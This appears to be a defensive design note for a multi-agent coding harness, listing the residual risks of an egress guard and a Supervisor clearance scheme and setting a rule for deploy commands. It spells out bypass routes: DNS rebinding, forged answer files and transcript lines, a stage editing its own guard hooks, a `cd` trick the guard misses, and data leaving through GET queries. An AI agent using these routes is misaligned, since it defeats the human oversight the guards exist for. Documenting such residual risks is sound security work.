Residuals of the #322 effect classifier: **DNS rebinding** — a name that resolves publicly when the guard classifies it and privately when WebFetch or curl connects (a short TTL) rides a public GET; a PreToolUse hook cannot see the connection, so it is bounded by GET only, no body, no credentials, no query and the 160-character URL cap. **The same-account limit** — a session with a shell could forge a batch or answer file in its own clone; the deny class blocks tool and text writes to settings and role profiles, not a crafted file under `.agents/team/`. **A classifier bug is a silent pass** — the mandatory denied fixtures and the role-matrix test are the backstop, and the classifier fails closed (an exception → the wrapper's fail-closed ask; in the tier → operator). **Non-stage writes of the guard layer** — the egress guard sees Bash and WebFetch only; a TeamLead, Advisor or Supervisor Edit/Write of `.claude/hooks/**` stays a normal Operator prompt, and their Bash write there gets no class (Operator decision d-4), until #323 adds a role-profile hook. **A write after an unresolvable `cd`** — only its name is judged: `cd "$H" && echo x > lib/x.py` with `$H=.claude/hooks` (no `hooks/` part in the target) is not seen (TeamLead answer Q1). **A stage may edit its own armed guard** (Operator decision d-2, harness work): an Edit/Write of the clone's `.claude/hooks/**` is allowed, and the clone's egress guard is the one that runs for that stage, so an injected stage could weaken its own later verdicts in the same run — bounded by the `operator` class for a Bash write there, by the stage's ask hook and checker running from the main checkout (which a stage never writes), and by the PR, QA and merge-check review of the diff; settings and role profiles stay a hard deny.

Residuals of the #323 Supervisor clearance: **same-account forgery** — every session runs under one account, so a session with a shell could write an answer file and append a crafted `tool_use` line to the Supervisor's transcript; the write guards stop tool writes to the clearance state, not a crafted shell command (the mandate's and the relay's limit, design §4). **The GET path** — a cleared long GET can carry data out in its query; it is bounded by the 2048-character cap, a public host checked at clearance time, the Supervisor's review of the rendered URL and the audit log. **A classifier or checker bug is now a silent pass or clearance** where it once was a prompt — the checker matrix and the refusal tests are the backstop, and the checker fails closed. **Sandbox network prompts skip the hook** (Claude probe): they stay human prompts. **Prompts auto mode approves never reach the hook.**

## Deploy is egress too

A deploy (`ssh`, `rsync`, `curl` to a staging origin) prompts like any other egress. Wrapping it in a project command (`/deploy-staging` and the like) does not change the rules above; it changes only *where* the approval happens. A project that needs a narrow standing allowance for a deploy host records it in this file, with the host and the command, and nowhere else.
